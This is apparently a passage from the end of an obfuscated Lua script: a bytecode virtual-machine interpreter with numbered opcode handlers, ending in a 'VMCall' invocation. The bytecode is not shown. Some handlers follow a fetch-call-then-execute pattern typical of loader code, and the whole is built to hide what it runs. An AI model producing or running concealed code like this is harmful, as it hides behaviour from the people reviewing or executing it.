              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            end
          elseif (Enum <= 384) then
            local Edx;
            local Results, Limit;
            local B;
            local A;
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
            Top = (Limit + A) - 1;
            Edx = 0;
            for Idx = A, Top do
              Edx = Edx + 1;
              Stk[Idx] = Results[Edx];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]]();
            VIP = VIP + 1;
            Inst = Instr[VIP];
            do
              return;
            end
          elseif (Enum > 385) then
            local Edx;
            local Results, Limit;
            local B;
            local A;
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
            Top = (Limit + A) - 1;
            Edx = 0;
            for Idx = A, Top do
              Edx = Edx + 1;
              Stk[Idx] = Results[Edx];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]]();
            VIP = VIP + 1;
            Inst = Instr[VIP];
            do
              return;
            end
          else
            local A;
            Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A] = Stk[A](Stk[A + 1]);
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]][Inst[3]] = Stk[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            do
              return;
            end
          end
        elseif (Enum <= 392) then
          if (Enum <= 389) then
            if (Enum <= 387) then
              local Edx;
              local Results, Limit;
              local B;
              local A;
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
                Stk[Inst[2]] = Env;
              else
                Stk[Inst[2]] = Env[Inst[3]];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              B = Stk[Inst[3]];
              Stk[A + 1] = B;
              Stk[A] = B[Inst[4]];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]] = Inst[3];
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
              Top = (Limit + A) - 1;
              Edx = 0;
              for Idx = A, Top do
                Edx = Edx + 1;
                Stk[Idx] = Results[Edx];
              end
              VIP = VIP + 1;
              Inst = Instr[VIP];
              A = Inst[2];
              Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
              VIP = VIP + 1;
              Inst = Instr[VIP];
              Stk[Inst[2]]();
              VIP = VIP + 1;
              Inst = Instr[VIP];
              do
                return;
              end
            elseif (Enum == 388) then
              local A = Inst[2];
              do
                return Stk[A](Unpack(Stk, A + 1, Inst[3]));
              end
            elseif (Stk[Inst[2]] == Stk[Inst[4]]) then
              VIP = VIP + 1;
            else
              VIP = Inst[3];
            end
          elseif (Enum <= 390) then
            local Edx;
            local Results, Limit;
            local B;
            local A;
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
            Top = (Limit + A) - 1;
            Edx = 0;
            for Idx = A, Top do
              Edx = Edx + 1;
              Stk[Idx] = Results[Edx];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]]();
            VIP = VIP + 1;
            Inst = Instr[VIP];
            do
              return;
            end
          elseif (Enum > 391) then
            local B;
            local A;
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3] ~= 0;
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A](Unpack(Stk, A + 1, Inst[3]));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            do
              return;
            end
          else
            local B;
            local A;
            A = Inst[2];
            Stk[A](Unpack(Stk, A + 1, Inst[3]));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A](Unpack(Stk, A + 1, Inst[3]));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
          end
        elseif (Enum <= 395) then
          if (Enum <= 393) then
            local Results;
            local Edx;
            local Results, Limit;
            local B;
            local A;
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Results, Limit = _R(Stk[A](Stk[A + 1]));
            Top = (Limit + A) - 1;
            Edx = 0;
            for Idx = A, Top do
              Edx = Edx + 1;
              Stk[Idx] = Results[Edx];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Results = {Stk[A](Unpack(Stk, A + 1, Top))};
            Edx = 0;
            for Idx = A, Inst[4] do
              Edx = Edx + 1;
              Stk[Idx] = Results[Edx];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            VIP = Inst[3];
          elseif (Enum == 394) then
            local Results;
            local Edx;
            local Results, Limit;
            local B;
            local A;
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A](Stk[A + 1]);
            VIP = VIP + 1;
            Inst = Instr[VIP];
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Results, Limit = _R(Stk[A](Stk[A + 1]));
            Top = (Limit + A) - 1;
            Edx = 0;
            for Idx = A, Top do
              Edx = Edx + 1;
              Stk[Idx] = Results[Edx];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Results = {Stk[A](Unpack(Stk, A + 1, Top))};
            Edx = 0;
            for Idx = A, Inst[4] do
              Edx = Edx + 1;
              Stk[Idx] = Results[Edx];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            VIP = Inst[3];
          else
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]][Inst[3]] = Inst[4];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            do
              return;
            end
          end
        elseif (Enum <= 397) then
          if (Enum > 396) then
            local Edx;
            local Results, Limit;
            local B;
            local A;
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3] ~= 0;
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
            Top = (Limit + A) - 1;
            Edx = 0;
            for Idx = A, Top do
              Edx = Edx + 1;
              Stk[Idx] = Results[Edx];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]]();
            VIP = VIP + 1;
            Inst = Instr[VIP];
            do
              return;
            end
          else
            local Edx;
            local Results, Limit;
            local B;
            local A;
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
              Stk[Inst[2]] = Env;
            else
              Stk[Inst[2]] = Env[Inst[3]];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            B = Stk[Inst[3]];
            Stk[A + 1] = B;
            Stk[A] = B[Inst[4]];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3];
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]] = Inst[3] ~= 0;
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
            Top = (Limit + A) - 1;
            Edx = 0;
            for Idx = A, Top do
              Edx = Edx + 1;
              Stk[Idx] = Results[Edx];
            end
            VIP = VIP + 1;
            Inst = Instr[VIP];
            A = Inst[2];
            Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
            VIP = VIP + 1;
            Inst = Instr[VIP];
            Stk[Inst[2]]();
            VIP = VIP + 1;
            Inst = Instr[VIP];
            do
              return;
            end
          end
        elseif (Enum == 398) then
          local Edx;
          local Results, Limit;
          local B;
          local A;
          if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
            Stk[Inst[2]] = Env;
          else
            Stk[Inst[2]] = Env[Inst[3]];
          end
          VIP = VIP + 1;
          Inst = Instr[VIP];
          if ((Inst[3] == "_ENV") or (Inst[3] == "getfenv")) then
            Stk[Inst[2]] = Env;
          else
            Stk[Inst[2]] = Env[Inst[3]];
          end
          VIP = VIP + 1;
          Inst = Instr[VIP];
          A = Inst[2];
          B = Stk[Inst[3]];
          Stk[A + 1] = B;
          Stk[A] = B[Inst[4]];
          VIP = VIP + 1;
          Inst = Instr[VIP];
          Stk[Inst[2]] = Inst[3];
          VIP = VIP + 1;
          Inst = Instr[VIP];
          Stk[Inst[2]] = Inst[3] ~= 0;
          VIP = VIP + 1;
          Inst = Instr[VIP];
          A = Inst[2];
          Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
          Top = (Limit + A) - 1;
          Edx = 0;
          for Idx = A, Top do
            Edx = Edx + 1;
            Stk[Idx] = Results[Edx];
          end
          VIP = VIP + 1;
          Inst = Instr[VIP];
          A = Inst[2];
          Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
          VIP = VIP + 1;
          Inst = Instr[VIP];
          Stk[Inst[2]]();
        else
          local Edx;
          local Results, Limit;
          local A;
          local K;
          local B;
          Stk[Inst[2]] = Inst[3];
          VIP = VIP + 1;
          Inst = Instr[VIP];
          B = Inst[3];
          K = Stk[B];
          for Idx = B + 1, Inst[4] do
            K = K .. Stk[Idx];
          end
          Stk[Inst[2]] = K;
          VIP = VIP + 1;
          Inst = Instr[VIP];
          Stk[Inst[2]] = Inst[3] ~= 0;
          VIP = VIP + 1;
          Inst = Instr[VIP];
          A = Inst[2];
          Results, Limit = _R(Stk[A](Unpack(Stk, A + 1, Inst[3])));
          Top = (Limit + A) - 1;
          Edx = 0;
          for Idx = A, Top do
            Edx = Edx + 1;
            Stk[Idx] = Results[Edx];
          end
          VIP = VIP + 1;
          Inst = Instr[VIP];
          A = Inst[2];
          Stk[A] = Stk[A](Unpack(Stk, A + 1, Top));
          VIP = VIP + 1;
          Inst = Instr[VIP];
          Stk[Inst[2]]();
          VIP = VIP + 1;
          Inst = Instr[VIP];
          do
            return;
          end
        end
        VIP = VIP + 1;
      end
    end;
  end
  return Wrap(Deserialize(), {}, vmenv)(...);
end
VMCall("LOL!", GetFEnv(), ...);
  --[🍭]--
